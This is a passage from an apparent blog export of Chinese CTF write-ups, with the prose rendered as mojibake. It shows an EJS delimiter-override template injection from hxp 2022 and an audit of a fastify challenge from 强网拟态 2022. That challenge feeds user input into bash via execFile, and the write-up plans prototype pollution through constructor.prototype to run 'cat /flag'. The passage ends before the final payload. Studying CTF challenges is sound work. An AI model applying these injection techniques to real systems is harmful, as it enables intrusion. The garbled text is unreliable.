<p>ä½†æ˜¯å¦‚ä½•ä¼ å‚ä½¿å¾—æ ‡ç­¾è¦†ç›–å¹¶ä¸”åŒæ—¶ä¼ å…¥æˆ‘ä»¬çš„<code>payload</code>ï¼Ÿ</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/:template&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> query = req.<span class="property">query</span>;</span><br><span class="line">  <span class="keyword">let</span> template = req.<span class="property">params</span>.<span class="property">template</span></span><br><span class="line">  <span class="keyword">if</span> (!<span class="regexp">/^[0-9A-F]&#123;8&#125;-[0-9A-F]&#123;4&#125;-[4][0-9A-F]&#123;3&#125;-[89AB][0-9A-F]&#123;3&#125;-[0-9A-F]&#123;12&#125;$/i</span>.<span class="title function_">test</span>(template)) &#123;</span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&quot;Not a valid card id&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (!fs.<span class="title function_">existsSync</span>(<span class="string">`views/<span class="subst">$&#123;template&#125;</span>.ejs`</span>)) &#123;</span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;Valentine\&#x27;s card does not exist&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (!query[<span class="string">&#x27;name&#x27;</span>]) &#123;</span><br><span class="line">    query[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> res.<span class="title function_">render</span>(template, query);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­çœ‹åˆ°å…³é”®ä»£ç </p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> res.<span class="title function_">render</span>(template, query);</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œä¼šå°†templateå’Œqueryå†…å®¹æ¸²æŸ“ï¼Œå°†queryä¸­çš„å€¼æŠŠæ¨¡æ¿ä¸­å˜é‡çš„å€¼æ›¿æ¢ï¼Œä»è€Œå¯ä»¥é€šè¿‡åœ¨queryä¸­é‡æ–°å®šä¹‰<code>delimiter</code>å‚æ•°ï¼Œç„¶åå®ç°æ¸²æŸ“è¦†ç›–åŸæœ‰çš„<code>?</code>åˆ†å‰²ç¬¦ï¼Œå°†å…¶æ›¿æ¢æˆå…¶ä»–å¯ä»¥ç»•è¿‡çš„åˆ†éš”ç¬¦</p>
<p>ä½†æ˜¯è¿™é‡Œè¿˜æœ‰è¿‡æ»¤ï¼Œå¯¹<code>template</code>è¿›è¡Œçš„è¿‡æ»¤ï¼Œè€Œ<code>template</code>å–è‡ª<code>:template</code></p>
<blockquote>
<p><code>:template</code> æ˜¯ä¸€ä¸ªåŠ¨æ€è·¯ç”±å‚æ•°ï¼Œå®ƒå¯ä»¥åŒ¹é… URL ä¸­çš„ä»»ä½•å€¼ã€‚ä¾‹å¦‚ï¼Œå¦‚æœè¯·æ±‚çš„ URL æ˜¯ <code>http://example.com/about</code>ï¼Œé‚£ä¹ˆ <code>:template</code> å°±ä¼šè¢«è®¾ç½®ä¸º <code>about</code></p>
</blockquote>
<p>è€Œtemplateçš„æ­£åˆ™åŒ¹é…å†…å®¹</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">!/^[<span class="number">0</span>-9A-F]&#123;<span class="number">8</span>&#125;-[<span class="number">0</span>-9A-F]&#123;<span class="number">4</span>&#125;-[<span class="number">4</span>][<span class="number">0</span>-9A-F]&#123;<span class="number">3</span>&#125;-[89AB][<span class="number">0</span>-9A-F]&#123;<span class="number">3</span>&#125;-[<span class="number">0</span>-9A-F]&#123;<span class="number">12</span>&#125;</span><br></pre></td></tr></table></figure>

<p>æœç´¢å‘ç°æ˜¯ <code>UUID version 4</code> çš„æ ¼å¼ï¼Œè€Œ<code>uuid</code>åœ¨ä¸Šé¢ä»£ç å‡ºç°</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">`/<span class="subst">$&#123;uuid&#125;</span>?name=<span class="subst">$&#123;name&#125;</span>`</span>);</span><br></pre></td></tr></table></figure>

<p>è¿™æ˜¯é‡å®šå‘æ—¶ç”Ÿæˆçš„uuidï¼Œä»£è¡¨å½“æˆ‘ä»¬è¢«é‡å®šå‘åï¼Œ</p>
<p><code>app</code>ä¼šè‡ªåŠ¨æ¸²æŸ“ä¸‹é¢å†…å®¹</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">http</span>://x.x.x.x:<span class="number">9086</span>/<span class="number">365</span>c9839-b1a3-<span class="number">4</span>df9-<span class="number">8</span>c1a-<span class="number">142378</span>b79cd5?name=<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥å¯ä»¥å…ˆæŠ“åŒ…ï¼Œå¾—åˆ°é‡å®šå‘çš„uuidï¼Œ</p>
<p>ç„¶ååœ¨åé¢æ·»åŠ <code>delimiter</code>å‚æ•°ï¼Œé‡æ–°å‘åŒ…ï¼Œä»è€Œå®ç°åˆ©ç”¨æ¸²æŸ“è¦†ç›–åŸæœ‰åˆ†éš”ç¬¦çš„ç›®çš„ï¼Œç„¶ååœ¨æŒ‰ä¸Šé¢çš„ä»£ç <code>POST</code>å‘é€<code>tmpl</code>å‚æ•°ã€åŒ…å«çš„æ˜¯ä¿®æ”¹äº†åˆ†éš”ç¬¦çš„<code>payload</code>ã€‘</p>
<hr>
<h3 id="è§£é¢˜æµç¨‹"><a href="#è§£é¢˜æµç¨‹" class="headerlink" title="è§£é¢˜æµç¨‹"></a>è§£é¢˜æµç¨‹</h3><p>å…ˆæ‰“ç®—å°†è¦†ç›–<code>%</code>æ¢æˆ<code>?</code>ï¼Œå…ˆå‘é€åˆ°<code>/template</code>ï¼Œè¿™é‡Œå› ä¸ºæ²¡æœ‰é»‘åå•é™åˆ¶å­—ç¬¦ï¼Œäºæ˜¯æˆ‘ä»¬çš„å†…å®¹æˆåŠŸå†™å…¥<code>views/$&#123;uuid&#125;.ejs</code>æ–‡ä»¶ä¸­ï¼Œè€Œ<code>uuid</code>å°±æ˜¯å“åº”åŒ…ä¸­çš„</p>
<blockquote>
<p>77354ee1-466d-402f-a829-ec5e859c223e</p>
</blockquote>
<p><img src="/post/2022hxp/image-20230411215254139.png" alt="image-20230411215254139"></p>
<p>ä½†æ˜¯åœ¨<code>views/$&#123;uuid&#125;.ejs</code>æ–‡ä»¶ä¸­æ˜¯ä»¥%ä¸ºåˆ†éš”ç¬¦ï¼Œäºæ˜¯éœ€è¦ä¿®æ”¹åˆ†éš”ç¬¦ä¸º<code>payload</code>çš„<code>?</code></p>
<p><img src="/post/2022hxp/image-20230411220246020.png" alt="image-20230411220246020"></p>
<p>å¾—åˆ°flag</p>
<hr>
<p>è¿›<code>docker</code>çœ‹çœ‹</p>
<p><img src="/post/2022hxp/image-20230411220931414.png" alt="image-20230411220931414"></p>
<hr>
]]></content>
      <categories>
        <category>ç½‘ç»œå®‰å…¨å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>Game</tag>
      </tags>
  </entry>
  <entry>
    <title>å¼ºç½‘æ‹Ÿæ€2022-wp</title>
    <url>//post/2022%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/</url>
    <content><![CDATA[<p><code>å­¦ä¹ å­¦ä¹ </code></p>
<span id="more"></span>

<h1 id="å¼ºç½‘æ‹Ÿæ€2022"><a href="#å¼ºç½‘æ‹Ÿæ€2022" class="headerlink" title="å¼ºç½‘æ‹Ÿæ€2022"></a>å¼ºç½‘æ‹Ÿæ€2022</h1><h2 id="WHOYOUARE"><a href="#WHOYOUARE" class="headerlink" title="WHOYOUARE"></a>WHOYOUARE</h2><p>è¿™é“é¢˜ç›®çš„ç¯å¢ƒæ˜¯<code>nodejs</code>ï¼ŒçŒœè€ƒç‚¹æ˜¯åŸå‹é“¾æ±¡æŸ“ï¼Œå…¶æ¡†æ¶æ ¹æ®é™„ä»¶åç§°å¯çŸ¥ä¸º<code>fastify</code></p>
<p><img src="/post/2022%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/image-20230825093507374.png" alt="image-20230825093507374"></p>
<p>çœ‹é¢˜ç›®åå­—å’Œåˆšæ‰“å¼€é¢˜ç›®çš„æç¤ºï¼ŒçŒœæµ‹æ±¡æŸ“æ¼æ´ç‚¹åº”è¯¥åœ¨<code>user</code>å¤„ï¼Œåº”è¯¥åœ¨æŸä¸ªæ£€æŸ¥<code>user</code>ä¿¡æ¯çš„åœ°æ–¹å¯ä»¥è¿›è¡ŒåŸå‹é“¾æ±¡æŸ“</p>
<hr>
<h3 id="ä»£ç å®¡è®¡"><a href="#ä»£ç å®¡è®¡" class="headerlink" title="ä»£ç å®¡è®¡"></a>ä»£ç å®¡è®¡</h3><p>å…ˆå®¡ä¸€ä¸‹<code>app.js</code></p>
<h4 id="app-js"><a href="#app-js" class="headerlink" title="app.js"></a>app.js</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> userRoutes = <span class="built_in">require</span>(<span class="string">&#x27;./routes/user&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> fastify = <span class="built_in">require</span>(<span class="string">&#x27;fastify&#x27;</span>)(&#123;</span><br><span class="line">    <span class="attr">logger</span>: &#123;</span><br><span class="line">        <span class="attr">level</span>: <span class="string">&#x27;error&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">const</span> port = process.<span class="property">env</span>.<span class="property">PORT</span> || <span class="number">3000</span></span><br><span class="line"><span class="keyword">const</span> host = process.<span class="property">env</span>.<span class="property">HOST</span> || <span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line"><span class="keyword">const</span> respWrapper = &#123;</span><br><span class="line">    <span class="attr">$id</span>: <span class="string">&#x27;respWrapper&#x27;</span>,</span><br><span class="line">    <span class="attr">type</span>: <span class="string">&#x27;object&#x27;</span>,</span><br><span class="line">    response : &#123;</span><br><span class="line">        <span class="attr">success</span>: &#123;</span><br><span class="line">            <span class="attr">type</span>: <span class="string">&#x27;object&#x27;</span>,</span><br><span class="line">            <span class="attr">properties</span>: &#123;</span><br><span class="line">                status : &#123; <span class="attr">type</span>: <span class="string">&#x27;number&#x27;</span> &#125;,</span><br><span class="line">                <span class="attr">info</span>: &#123; <span class="attr">type</span>: <span class="string">&#x27;string&#x27;</span> &#125;,</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fastify.<span class="title function_">addSchema</span>(respWrapper)</span><br><span class="line">fastify.<span class="title function_">register</span>(userRoutes)</span><br><span class="line"></span><br><span class="line">fastify.<span class="title function_">listen</span>(&#123;</span><br><span class="line">    host, port</span><br><span class="line">&#125;, <span class="function">(<span class="params">err, address</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        fastify.<span class="property">log</span>.<span class="title function_">error</span>(err)</span><br><span class="line">        process.<span class="title function_">exit</span>(<span class="number">1</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    fastify.<span class="property">log</span>.<span class="title function_">info</span>(<span class="string">`server listening on <span class="subst">$&#123;address&#125;</span>`</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>å‘ç°ç½‘ç«™è¿˜æœ‰ä¸ªè·¯ç”±<code>/user</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> userRoutes = <span class="built_in">require</span>(<span class="string">&#x27;./routes/user&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>è®¿é—®</p>
<p><img src="/post/2022%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/image-20230825100242391.png" alt="image-20230825100242391"></p>
<p>æ˜¾ç¤º</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;message&quot;</span>:<span class="string">&quot;Route GET:/user not found&quot;</span>,<span class="string">&quot;error&quot;</span>:<span class="string">&quot;Not Found&quot;</span>,<span class="string">&quot;statusCode&quot;</span>:<span class="number">404</span>&#125;</span><br></pre></td></tr></table></figure>

<p>çœ‹æ ·å­æ˜¯æ— æ³•ç”¨GETæ–¹å¼è®¿é—®<code>/user</code>è·¯ç”±</p>
<p>äºæ˜¯å®¡è®¡ä¸€ä¸‹<code>user.js</code></p>
<h4 id="user-js"><a href="#user-js" class="headerlink" title="user.js"></a>user.js</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> merge = <span class="built_in">require</span>(<span class="string">&#x27;../utils/merge&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> bin = <span class="string">&quot;/bin/bash&quot;</span></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">ChildProcess</span> = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">checkUser</span>(<span class="params">command</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title class_">Array</span>.<span class="title function_">isArray</span>(command) === <span class="literal">false</span> || command.<span class="property">length</span> &gt; <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; command.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">let</span> cmd = command[i];</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span> cmd !== <span class="string">&#x27;string&#x27;</span> || cmd.<span class="property">length</span> &gt; <span class="number">4</span> || <span class="title class_">RegExp</span>(<span class="regexp">/^[^a-zA-Z0-9-]+$/</span>).<span class="title function_">test</span>(command[i])) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">routes</span> (fastify, options) &#123;</span><br><span class="line">    fastify.<span class="title function_">route</span>(</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">            <span class="attr">url</span>: <span class="string">&#x27;/user&#x27;</span>,</span><br><span class="line">            <span class="attr">schema</span>: &#123;</span><br><span class="line">                <span class="attr">querystring</span>: &#123;</span><br><span class="line">                    <span class="attr">user</span>: &#123; <span class="attr">type</span>: <span class="string">&#x27;string&#x27;</span> &#125;,</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">additionalProperties</span>: <span class="literal">false</span>,</span><br><span class="line">                <span class="attr">response</span>: &#123;</span><br><span class="line">                    <span class="number">200</span>: &#123;</span><br><span class="line">                        <span class="attr">$ref</span>: <span class="string">&#x27;respWrapper#/response/success&#x27;</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">preHandler</span>: <span class="keyword">function</span> (<span class="params">request, reply, done</span>) &#123;</span><br><span class="line">                <span class="comment">//user init</span></span><br><span class="line">                request.<span class="property">user</span> = &#123;username : <span class="string">&#x27;guest&#x27;</span>, <span class="attr">command</span>: [<span class="string">&quot;-c&quot;</span>, <span class="string">&quot;id&quot;</span>]&#125;</span><br><span class="line">                <span class="keyword">let</span> user = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(request.<span class="property">body</span>.<span class="property">user</span>)</span><br><span class="line">                <span class="comment">// clean user command</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_">checkUser</span>(user.<span class="property">command</span>) !== <span class="literal">true</span>) &#123;</span><br><span class="line">                    user.<span class="property">command</span> = [<span class="string">&quot;-c&quot;</span>, <span class="string">&quot;id&quot;</span>]</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="title function_">merge</span>(request.<span class="property">user</span>, user)</span><br><span class="line">                &#125;<span class="keyword">catch</span> (e)&#123;</span><br><span class="line">                    reply.<span class="title function_">code</span>(<span class="number">400</span>).<span class="title function_">send</span>(&#123;<span class="attr">status</span>: <span class="number">1</span>, <span class="attr">info</span>: <span class="string">&quot;Something error&quot;</span>&#125;)</span><br><span class="line">                    <span class="keyword">return</span> ;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="title function_">done</span>()</span><br><span class="line">            &#125;,</span><br><span class="line">            handler : <span class="keyword">function</span> (<span class="params">request, reply</span>) &#123;</span><br><span class="line">                <span class="title class_">ChildProcess</span>.<span class="title function_">execFile</span>(bin, request.<span class="property">user</span>.<span class="property">command</span>, <span class="function">(<span class="params">error, stdout, stderr</span>) =&gt;</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (error) &#123;</span><br><span class="line">                        reply.<span class="title function_">code</span>(<span class="number">400</span>).<span class="title function_">send</span>(&#123;<span class="attr">status</span>: <span class="number">1</span>, <span class="attr">info</span>: error&#125;)</span><br><span class="line">                    &#125;</span><br><span class="line">                    reply.<span class="title function_">code</span>(<span class="number">200</span>).<span class="title function_">send</span>(&#123; status : <span class="number">0</span> , info : <span class="string">`User of <span class="subst">$&#123;request.user.username&#125;</span> : <span class="subst">$&#123;stdout&#125;</span>`</span>&#125;);</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    fastify.<span class="title function_">route</span>(&#123;</span><br><span class="line">        <span class="attr">method</span>: <span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">        <span class="attr">url</span>: <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">        <span class="attr">response</span>: &#123;</span><br><span class="line">            <span class="attr">$ref</span>: <span class="string">&#x27;respWrapper#/response/success&#x27;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">handler</span>: <span class="keyword">function</span> (<span class="params">request, reply</span>) &#123;</span><br><span class="line">            reply.<span class="title function_">send</span>(&#123; <span class="attr">status</span>: <span class="number">0</span>, <span class="attr">info</span>: <span class="string">&#x27;go user&#x27;</span> &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = routes</span><br></pre></td></tr></table></figure>

<p>åŸå‹é“¾æ±¡æŸ“é‡ç‚¹çœ‹<code>merge</code>å’Œ<code>JSON.parse</code>ï¼Œå‘ç°ä»£ç ï¼Œ</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> user = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(request.<span class="property">body</span>.<span class="property">user</span>)</span><br></pre></td></tr></table></figure>



<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="title function_">merge</span>(request.<span class="property">user</span>, user)</span><br><span class="line">&#125;<span class="keyword">catch</span> (e)&#123;</span><br><span class="line">    reply.<span class="title function_">code</span>(<span class="number">400</span>).<span class="title function_">send</span>(&#123;<span class="attr">status</span>: <span class="number">1</span>, <span class="attr">info</span>: <span class="string">&quot;Something error&quot;</span>&#125;)</span><br><span class="line">    <span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­<code>request.user</code>çš„å€¼ä¸ºï¼Œ</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">request.<span class="property">user</span> = &#123;username : <span class="string">&#x27;guest&#x27;</span>, <span class="attr">command</span>: [<span class="string">&quot;-c&quot;</span>, <span class="string">&quot;id&quot;</span>]&#125;</span><br></pre></td></tr></table></figure>

<p>è€Œ<code>user</code>çš„å€¼ä¸ºï¼Œ</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> user = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(request.<span class="property">body</span>.<span class="property">user</span>)</span><br></pre></td></tr></table></figure>

<p><code>request.user</code>æ˜¯åˆå§‹åŒ–çš„<code>user</code>ï¼Œæ‰€ä»¥æ— æ³•ç›´æ¥æ±¡æŸ“ï¼Œä½†æ˜¯<code>user</code>æ˜¯ä»è¯·æ±‚ä½“ä¸­å¾—åˆ°çš„æ•°æ®ï¼Œå¹¶ä¸”é€šè¿‡Jsonæ ¼å¼åŒ–ï¼Œå…¶ä¸­æ˜¯å¯ä»¥åŠ ä¸€äº›å®ä½“ï¼ˆå¦‚<code>__proto__</code>,<code>constructor.prototype</code>ï¼‰è¿›å»ï¼Œæ˜¯å¯ä»¥è¢«æˆ‘ä»¬æ±¡æŸ“çš„ï¼Œæ‰€ä»¥ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆæ±¡æŸ“<code>user</code>ï¼Œç„¶åé€šè¿‡<code>merge</code>åˆå¹¶ï¼Œå°†<code>user</code>ä¸­çš„å€¼ä¼ å…¥<code>request.user</code>ä¸­</p>
<p>ç„¶åæˆ‘ä»¬å¯ä»¥çœ‹çœ‹<code>merge</code>çš„å†…å®¹ï¼Œ</p>
<h4 id="merge-js"><a href="#merge-js" class="headerlink" title="merge.js"></a>merge.js</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> whileTypes = [<span class="string">&#x27;boolean&#x27;</span>, <span class="string">&#x27;string&#x27;</span>, <span class="string">&#x27;number&#x27;</span>, <span class="string">&#x27;bigint&#x27;</span>, <span class="string">&#x27;symbol&#x27;</span>, <span class="string">&#x27;undefined&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">merge</span> = (<span class="params">target, source</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span>(!whileTypes.<span class="title function_">includes</span>(<span class="keyword">typeof</span> source[key]) &amp;&amp; !whileTypes.<span class="title function_">includes</span>(<span class="keyword">typeof</span> target[key]))&#123;</span><br><span class="line">            <span class="keyword">if</span>(key !== <span class="string">&#x27;__proto__&#x27;</span>)&#123;</span><br><span class="line">                <span class="title function_">merge</span>(target[key], source[key]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            target[key] = source[key];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = merge</span><br></pre></td></tr></table></figure>

<p>å‘ç°<code>merge</code>å¯¹å†…å®¹è¿›è¡Œäº†è¿‡æ»¤å’Œæ£€æŸ¥ï¼Œ</p>
<ul>
<li>å¦‚æœ<code>request.user</code>æˆ–<code>user</code>ä¸­ï¼Œæœ‰åŒ…å«<code>whileTypes</code>ä¸­çš„å†…å®¹ï¼Œå°±ä¸ä¼šæ‰§è¡Œ<code>merge</code></li>
<li>å¦‚æœé”®å€¼ä¸­æœ‰<code>__proto__</code>ï¼Œä¹Ÿä¸ä¼šæ‰§è¡Œ<code>merge</code></li>
</ul>
<p>è¿‡æ»¤å…³é”®å­—è¿˜å¥½ï¼Œåªæ˜¯è¿‡æ»¤äº†<code>__proto__</code>ï¼Œéœ€è¦ä¸€ä¸ªç›¸åŒåŠŸèƒ½çš„æ¥å¸®åŠ©ç»•è¿‡ï¼Œæ¯”å¦‚<code>constructor.prototype</code></p>
<p>ä½†æ˜¯åœ¨<code>merge</code>å‰é¢è¿˜è¦ä¸ª<code>checkUser</code>ï¼Œå°†<code>command</code>ä¹Ÿè¿›è¡Œäº†é™åˆ¶</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">checkUser</span>(<span class="params">command</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title class_">Array</span>.<span class="title function_">isArray</span>(command) === <span class="literal">false</span> || command.<span class="property">length</span> &gt; <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; command.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">let</span> cmd = command[i];</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span> cmd !== <span class="string">&#x27;string&#x27;</span> || cmd.<span class="property">length</span> &gt; <span class="number">4</span> || <span class="title class_">RegExp</span>(<span class="regexp">/^[^a-zA-Z0-9-]+$/</span>).<span class="title function_">test</span>(command[i])) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç”±æ¡ä»¶è¯­å¥å¯çŸ¥ï¼Œè¦æ±‚<code>command</code>å¿…é¡»æ˜¯æ•°ç»„ä¸”æ•°ç»„ä¸­å…ƒç´ ä¸ªæ•°è¦å°äºç­‰äº<code>2</code>ï¼Œ</p>
<p>ä¸”è¦æ±‚commandæ•°ç»„ä¸­çš„å…ƒç´ å¿…é¡»ä¸ºå­—ç¬¦ä¸²ä¸”é•¿åº¦è¦å°äºç­‰äº4ï¼Œå¹¶ä»¥å­—æ¯æˆ–è€…æ•°å­—æˆ–è€…-å¼€å¤´</p>
<p>å¦‚æœä¸æ»¡è¶³<code>checkUser</code>ï¼Œå°±ä¼šæ‰§è¡Œï¼š</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">user.<span class="property">command</span> = [<span class="string">&quot;-c&quot;</span>, <span class="string">&quot;id&quot;</span>]</span><br></pre></td></tr></table></figure>

<p>å°†<code>command</code>ç›´æ¥èµ‹å€¼ä¸ºæ‰§è¡Œ<code>id</code>å‘½ä»¤ï¼Œè€Œä¸èƒ½æ‰§è¡Œå…¶ä»–å‘½ä»¤ã€‚</p>
<p>&#x3D;&#x3D;&gt;å†ç”±åˆå§‹åŒ–<code>request.user</code>ï¼Œæ‰€ä»¥æœ€åæ„é€ <code>request.body.user</code>çš„ç»“æ„åº”è¯¥ä¸º</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;user&quot;</span><span class="punctuation">:</span><span class="string">&quot;&#123;&quot;</span>username<span class="string">&quot;:&quot;</span>guest<span class="string">&quot;,&quot;</span>command<span class="string">&quot;:[&quot;</span>-c<span class="string">&quot;,&quot;</span>id<span class="string">&quot;]&#125;&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>åªæ˜¯æˆ‘ä»¬æƒ³è¦æ‰§è¡Œçš„<code>command</code>æ˜¯<code>cat /flag</code>ï¼Œä½†æ˜¯å¾ˆæ˜æ˜¾æˆ‘ä»¬é•¿åº¦é™åˆ¶è¿‡ä¸äº†ï¼Œæ‰€ä»¥å¦‚æœæƒ³è¦æ‰§è¡Œå‘½ä»¤æ˜¯ä¸èƒ½æŠŠå€¼å†™åˆ°<code>command</code>ä¸­ï¼Œä¸ç„¶è‚¯å®šä¼šè¢«æ‹¦æˆª</p>
<p>æˆ‘ä»¬çœ‹çœ‹<code>user.js</code>ä¸­ï¼Œæ˜¯å¦‚ä½•æ‰§è¡Œ<code>command</code>çš„ï¼Œ</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">handler : <span class="keyword">function</span> (<span class="params">request, reply</span>) &#123;</span><br><span class="line">                <span class="title class_">ChildProcess</span>.<span class="title function_">execFile</span>(bin, request.<span class="property">user</span>.<span class="property">command</span>, <span class="function">(<span class="params">error, stdout, stderr</span>) =&gt;</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (error) &#123;</span><br><span class="line">                        reply.<span class="title function_">code</span>(<span class="number">400</span>).<span class="title function_">send</span>(&#123;<span class="attr">status</span>: <span class="number">1</span>, <span class="attr">info</span>: error&#125;)</span><br><span class="line">                    &#125;</span><br><span class="line">                    reply.<span class="title function_">code</span>(<span class="number">200</span>).<span class="title function_">send</span>(&#123; status : <span class="number">0</span> , info : <span class="string">`User of <span class="subst">$&#123;request.user.username&#125;</span> : <span class="subst">$&#123;stdout&#125;</span>`</span>&#125;);</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<p>å‘ç°å®ƒæ‰§è¡Œæ˜¯æ‰§è¡Œ<code>request.user.command</code>çš„å†…å®¹ï¼Œé‚£ä¾¿åˆå›åˆ°æ±¡æŸ“userï¼Œç„¶åå†é€šè¿‡<code>merge</code>æ±¡æŸ“<code>request.user</code>ï¼Œæ‰€ä»¥è¿™é‡Œå°è¯•æ±¡æŸ“<code>request.user</code>çš„å®ä½“ä¸­çš„<code>command</code>å‚æ•°</p>
<blockquote>
